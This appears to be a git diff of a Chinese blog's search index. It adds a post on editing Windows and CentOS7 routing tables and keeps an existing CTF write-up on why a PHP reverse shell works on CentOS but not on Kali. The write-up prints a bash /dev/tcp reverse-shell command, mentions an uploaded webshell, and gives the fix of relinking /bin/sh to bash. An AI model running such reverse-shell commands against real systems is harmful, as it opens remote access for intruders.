@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[修改系统路由]]></title>
+    <url>%2F2019%2F01%2F26%2Froute-edit%2F</url>
+    <content type="text"><![CDATA[进行测试时，由于设备属于一个局域网无法上网，而做题过程又需要网。这个时候就需要进行路由设置了。下面是Windows及Centos7的路由设置 首先为了连入设备，需要插入网线；除此之外，为了连入网络需要连接上网wifi。此时查看路由表会存在两条默认路由，我们需要删除掉设备的默认路由，获取设备中存在的所有网段，手动添加指定网段的静态路由。 Windows 系统路由正常来说，如下方法添加的路由关闭命令行或重启失效。但经过测试发现个别时候重启后依旧存在，并且影响系统网络。 以管理员身份运行如下命令123route print # 查看路由表route add 192.168.50.0 mask 255.255.255.0 192.168.3.1 # 添加一条静态路由route delete 0.0.0.0 mask 0.0.0.0 192.168.3.1 # 删除一条静态路由 这里给出如果重启后依旧存在设定的路由，如何恢复默认状态 以管理员身份运行如下命令123route -f # 清除路由表netsh int ipv4 reset # 重置IPv4协议shutdown /t 0 /r # 立即重启 Centos7 系统路由如下方法添加的路由重启失效 以root权限运行如下命令123route -n # 查看路由表route add -net 192.168.50.0 netmask 255.255.255.0 gw 192.168.3.1 # 添加一条静态路由route del -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.3.1 # 删除一条静态路由]]></content>
+      <categories>
+        <category>route</category>
+      </categories>
+      <tags>
+        <tag>route</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[关于Centos与Ubuntu使用php反弹shell结果不同的问题]]></title>
     <url>%2F2019%2F01%2F15%2Freverse-shell-diff%2F</url>
     <content type="text"><![CDATA[在复现一个CTF题时，上传上去了一句话木马，但是不允许用菜刀连接，所以我是想vps上监听一个端口，然后直接用hackbar反弹shell，结果死活反弹不回来。而在我印象中是有直接使用hackbar反弹shell成功的前例。因而有了此篇文章。刚开始是在kali上测试的，也是死活谈不回来 正常的反弹命令：bash -i &gt;&amp;/dev/tcp/192.168.1.103/123 0&gt;&amp;1然后由于是在post中，所以需要给&amp;编码，变成%26，可是还是弹不回来？？？ 后来试着在kali终端中直接执行这条命令，没问题，能弹回来 然后写了一个php脚本，内容如下： 然后，执行该脚本，他丫的居然报错了？？？ 我去？什么鬼？ 后来在Centos7中创建了同样的一个脚本，执行得到如下结果： 这个为啥就成功弹回来了？？？不科学伐！！！ 经过测试得到，Centos7中可以弹回shell，而kali就是不行！！！ 后来网上搜索了一下解决方法，是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。。。 可以看到kali中确实sh默认是链接的dash 将bash链接到sh后，再次执行该脚本 12mv /bin/sh /bin/sh.origln -s /bin/bash /bin/sh 然后就可以成功的弹回shell了]]></content>
